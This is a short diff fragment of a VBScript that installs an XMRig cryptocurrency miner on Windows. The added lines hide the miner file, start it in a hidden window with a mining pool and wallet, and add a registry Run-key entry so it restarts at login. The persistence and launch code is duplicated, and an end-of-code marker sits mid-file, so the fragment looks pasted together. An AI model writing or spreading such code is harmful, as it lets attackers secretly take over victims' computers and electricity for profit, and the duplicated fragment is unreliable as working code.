@@ -43,3 +43,13 @@ wsh.Run """" & minerFolder & "\" & minerName & """ -o " & pool & " -u " & wallet
 strScriptPath = WScript.ScriptFullName
 wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\XMRigMiner", "wscript.exe """ & strScriptPath & """"
 ' --- END OF CODE ---
+' 4. Hide File
+fso.GetFile(minerFolder & "\" & minerName).Attributes = 2
+
+' 5. Run Miner (Hidden)
+wsh.Run """" & minerFolder & "\" & minerName & """ -o " & pool & " -u " & wallet & " --cpu-priority 1 --threads=2", 0, False
+
+' --- PERSISTENCE (Registry Startup) ---
+strScriptPath = WScript.ScriptFullName
+wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\XMRigMiner", "wscript.exe """ & strScriptPath & """"
+' --- END OF CODE ---
